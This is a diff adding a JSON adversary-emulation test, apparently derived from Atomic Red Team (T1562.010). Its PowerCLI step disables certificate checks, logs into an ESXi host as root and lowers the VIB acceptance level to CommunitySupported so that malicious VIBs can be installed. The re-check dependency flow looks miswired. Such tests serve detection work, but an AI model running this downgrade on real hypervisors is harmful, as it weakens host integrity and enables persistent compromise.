@@ -1,0 +1,98 @@
+{
+  "id": "062f92c9-28b1-4391-a5f8-9d8ca6852091",
+  "name": "ESXi - Change VIB acceptance level to CommunitySupported via PowerCLI",
+  "description": "An adversary can change the VIB acceptance level to CommunitySupported to downgrade the acceptance criteria.This can be accomplished via PowerCLI. Afterwards an adversary may proceed to installing malicious VIBs on the host.\n[Reference](https://www.mandiant.com/resources/blog/esxi-hypervisors-detection-hardening)\n",
+  "platforms": [
+    "linux"
+  ],
+  "steps": [
+    {
+      "id": "4f5035ee-f4ef-4ba3-8114-5f0eda87f045",
+      "type": "execute-command",
+      "data": {
+        "command": "Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false \nConnect-VIServer -Server #{vm_host} -User #{vm_user} -Password #{vm_pass}\n(Get-EsxCli -VMHost #{vm_host} -V2).software.acceptance.set.Invoke(@{level = \"CommunitySupported\"})\nDisconnect-VIServer -Confirm:$false\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "0c9cf8bc-060e-4fa8-86a4-e1d35de50953",
+      "name": "Check dependency 1/1",
+      "description": "Check if VMWARE PowerCLI PowerShell Module is installed.\n",
+      "type": "execute-command",
+      "data": {
+        "command": "$RequiredModule = Get-Module -Name VMware.PowerCLI -ListAvailable\nif (-not $RequiredModule) {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "4c2fb196-b3ab-40c9-a9d1-f1ccd0714b87",
+      "name": "Resolve dependency 1/1",
+      "description": "Check if VMWARE PowerCLI PowerShell Module is installed.\n",
+      "type": "execute-command",
+      "data": {
+        "command": "Install-Module -Name VMware.PowerCLI -Confirm:$false\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "91a5cab1-1bdc-4817-8f22-e64952a02d16",
+      "name": "Re-check dependency 1/1",
+      "description": "Check if VMWARE PowerCLI PowerShell Module is installed.\n",
+      "type": "execute-command",
+      "data": {
+        "command": "$RequiredModule = Get-Module -Name VMware.PowerCLI -ListAvailable\nif (-not $RequiredModule) {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "0c9cf8bc-060e-4fa8-86a4-e1d35de50953",
+      "p": "on-success",
+      "o": "4f5035ee-f4ef-4ba3-8114-5f0eda87f045"
+    },
+    {
+      "s": "0c9cf8bc-060e-4fa8-86a4-e1d35de50953",
+      "p": "on-failure",
+      "o": "4c2fb196-b3ab-40c9-a9d1-f1ccd0714b87"
+    },
+    {
+      "s": "4c2fb196-b3ab-40c9-a9d1-f1ccd0714b87",
+      "p": "on-success",
+      "o": "91a5cab1-1bdc-4817-8f22-e64952a02d16"
+    },
+    {
+      "s": "91a5cab1-1bdc-4817-8f22-e64952a02d16",
+      "p": "on-failure",
+      "o": "4f5035ee-f4ef-4ba3-8114-5f0eda87f045"
+    }
+  ],
+  "tags": [
+    "T1562.010",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "vm_host",
+      "type": "string",
+      "description": "Specify the host name of the ESXi Server",
+      "value": "atomic.local"
+    },
+    {
+      "name": "vm_user",
+      "type": "string",
+      "description": "Specify the privilege user account on ESXi Server",
+      "value": "root"
+    },
+    {
+      "name": "vm_pass",
+      "type": "string",
+      "description": "Specify the privilege user password on ESXi Server",
+      "value": "pass"
+    }
+  ]
+}
